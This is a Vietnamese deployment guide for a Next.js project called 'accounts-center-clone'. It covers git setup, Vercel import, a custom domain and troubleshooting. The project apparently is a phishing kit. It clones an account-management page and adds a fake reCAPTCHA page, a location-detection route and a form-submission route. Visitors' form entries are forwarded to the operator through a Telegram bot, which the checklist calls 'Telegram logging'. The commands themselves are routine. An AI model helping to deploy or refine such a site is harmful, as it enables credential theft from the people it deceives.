# Hướng dẫn Deploy lên Vercel

## Yêu cầu trước khi deploy

1. **Tài khoản Vercel**: Đăng ký tại [vercel.com](https://vercel.com) (có thể dùng GitHub, GitLab, hoặc Bitbucket để đăng nhập)

2. **Git Repository**: Project phải được push lên GitHub, GitLab, hoặc Bitbucket

3. **Environment Variables**: Chuẩn bị các biến môi trường cần thiết

## Bước 1: Chuẩn bị Git Repository

### 1.1. Khởi tạo Git (nếu chưa có)

```bash
cd accounts-center-clone
git init
git add .
git commit -m "Initial commit"
```

### 1.2. Tạo repository trên GitHub

1. Truy cập [github.com](https://github.com)
2. Click "New repository"
3. Đặt tên repository (ví dụ: `accounts-center-clone`)
4. **KHÔNG** tích vào "Initialize with README"
5. Click "Create repository"

### 1.3. Push code lên GitHub

```bash
git remote add origin https://github.com/YOUR_USERNAME/accounts-center-clone.git
git branch -M main
git push -u origin main
```

**Lưu ý**: Thay `YOUR_USERNAME` bằng username GitHub của bạn.

## Bước 2: Deploy lên Vercel

### Cách 1: Deploy qua Vercel Dashboard (Khuyên dùng)

1. **Đăng nhập Vercel**:
   - Truy cập [vercel.com](https://vercel.com)
   - Click "Sign Up" hoặc "Log In"
   - Chọn đăng nhập bằng GitHub/GitLab/Bitbucket

2. **Import Project**:
   - Click "Add New..." → "Project"
   - Chọn repository `accounts-center-clone` từ danh sách
   - Click "Import"

3. **Cấu hình Project**:
   - **Framework Preset**: Next.js (tự động detect)
   - **Root Directory**: `./` (mặc định)
   - **Build Command**: `npm run build` (mặc định)
   - **Output Directory**: `.next` (mặc định)
   - **Install Command**: `npm install` (mặc định)

4. **Thêm Environment Variables**:
   - Click "Environment Variables"
   - Thêm các biến sau:
     ```
     TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
     TELEGRAM_CHAT_ID=your_telegram_chat_id_here
     ```
   - Chọn môi trường: **Production**, **Preview**, và **Development**
   - Click "Save"

5. **Deploy**:
   - Click "Deploy"
   - Đợi quá trình build hoàn tất (thường mất 2-5 phút)
   - Sau khi deploy xong, bạn sẽ nhận được URL dạng: `https://accounts-center-clone.vercel.app`

### Cách 2: Deploy qua Vercel CLI

1. **Cài đặt Vercel CLI**:
   ```bash
   npm i -g vercel
   ```

2. **Đăng nhập**:
   ```bash
   vercel login
   ```

3. **Deploy**:
   ```bash
   cd accounts-center-clone
   vercel
   ```

4. **Làm theo hướng dẫn**:
   - Chọn scope (tài khoản cá nhân hoặc team)
   - Link to existing project? → `N` (lần đầu)
   - Project name → Nhập tên project hoặc Enter để dùng mặc định
   - Directory → `./` (Enter)
   - Override settings? → `N` (Enter)

5. **Thêm Environment Variables**:
   ```bash
   vercel env add TELEGRAM_BOT_TOKEN
   vercel env add TELEGRAM_CHAT_ID
   ```
   - Nhập giá trị cho mỗi biến
   - Chọn môi trường: Production, Preview, Development

6. **Deploy lại để áp dụng env vars**:
   ```bash
   vercel --prod
   ```

## Bước 3: Cấu hình Custom Domain (Tùy chọn)

1. Vào **Project Settings** → **Domains**
2. Nhập domain của bạn (ví dụ: `accounts-center.example.com`)
3. Làm theo hướng dẫn để cấu hình DNS:
   - Thêm CNAME record trỏ đến `cname.vercel-dns.com`
   - Hoặc thêm A record với IP từ Vercel

## Bước 4: Kiểm tra sau khi Deploy

1. **Truy cập URL**: Mở URL được cung cấp bởi Vercel
2. **Kiểm tra các trang**:
   - `/` → Redirect đến `/accounts-center`
   - `/accounts-center` → Trang chính
   - `/recaptcha` → Trang reCAPTCHA
3. **Test form flow**: Điền form và kiểm tra Telegram logs
4. **Kiểm tra console**: Mở DevTools để xem có lỗi không

## Troubleshooting

### ❌ Build failed

**Nguyên nhân thường gặp**:
- Thiếu dependencies
- Lỗi TypeScript
- Lỗi trong code

**Giải pháp**:
1. Chạy `npm run build` trên local để kiểm tra lỗi
2. Xem log build trên Vercel Dashboard
3. Sửa lỗi và push lại

### ❌ Environment Variables không hoạt động

**Nguyên nhân**:
- Chưa thêm env vars trên Vercel
- Chưa deploy lại sau khi thêm env vars

**Giải pháp**:
1. Kiểm tra env vars trong Project Settings → Environment Variables
2. Đảm bảo đã chọn đúng môi trường (Production, Preview, Development)
3. Redeploy project

### ❌ API routes không hoạt động

**Nguyên nhân**:
- Route không được export đúng
- Lỗi trong API handler

**Giải pháp**:
1. Kiểm tra file `app/api/*/route.ts` có export đúng function không
2. Xem logs trên Vercel Dashboard → Functions
3. Test API bằng cách gọi trực tiếp: `https://your-domain.vercel.app/api/...`

### ❌ Images không hiển thị

**Nguyên nhân**:
- Đường dẫn ảnh sai
- Ảnh không được copy vào build

**Giải pháp**:
1. Đảm bảo ảnh nằm trong thư mục `public/`
2. Sử dụng đường dẫn tuyệt đối: `/image.png` thay vì `./image.png`
3. Kiểm tra Next.js Image component có `src` đúng không

### ❌ Telegram không nhận được messages

**Nguyên nhân**:
- Env vars chưa được set
- Bot token hoặc Chat ID sai
- Bot chưa được start

**Giải pháp**:
1. Kiểm tra env vars trên Vercel
2. Test bot token và chat ID bằng cách gọi API thủ công
3. Đảm bảo bot đã được start (`/start`)

## Cấu trúc Project trên Vercel

```
accounts-center-clone/
├── app/
│   ├── accounts-center/
│   │   └── page.tsx          # Trang chính
│   ├── recaptcha/
│   │   └── page.tsx          # Trang reCAPTCHA
│   ├── api/
│   │   ├── detect-location/
│   │   ├── log-event/
│   │   └── submit-form/
│   ├── layout.tsx
│   └── page.tsx              # Redirect đến /accounts-center
├── components/
├── public/                   # Static files
├── .env.local                # Local env (không commit)
├── next.config.js
├── package.json
└── tailwind.config.ts
```

## Lưu ý quan trọng

1. **`.env.local` không được commit**: File này đã có trong `.gitignore`
2. **Environment Variables**: Phải thêm trên Vercel Dashboard, không hardcode trong code
3. **Build Command**: Mặc định là `npm run build`, không cần thay đổi
4. **Node Version**: Vercel tự động detect từ `package.json` hoặc `.nvmrc`
5. **Auto Deploy**: Mỗi khi push code lên GitHub, Vercel sẽ tự động deploy

## Các lệnh hữu ích

```bash
# Deploy preview
vercel

# Deploy production
vercel --prod

# Xem logs
vercel logs

# Xem environment variables
vercel env ls

# Xóa environment variable
vercel env rm TELEGRAM_BOT_TOKEN

# Xem thông tin project
vercel inspect
```

## Tài liệu tham khảo

- [Vercel Documentation](https://vercel.com/docs)
- [Next.js Deployment](https://nextjs.org/docs/deployment)
- [Environment Variables](https://vercel.com/docs/concepts/projects/environment-variables)

## Checklist trước khi Deploy

- [ ] Code đã được push lên Git repository
- [ ] `npm run build` chạy thành công trên local
- [ ] Đã chuẩn bị Telegram Bot Token và Chat ID
- [ ] Đã kiểm tra tất cả các trang hoạt động đúng
- [ ] Đã test form flow và Telegram logging
- [ ] Đã kiểm tra responsive trên mobile
- [ ] Đã kiểm tra SEO metadata

## Sau khi Deploy

1. ✅ Test tất cả các tính năng trên production
2. ✅ Kiểm tra Telegram logs hoạt động
3. ✅ Test trên các trình duyệt khác nhau
4. ✅ Test trên mobile devices
5. ✅ Kiểm tra performance và loading speed

Chúc bạn deploy thành công! 🚀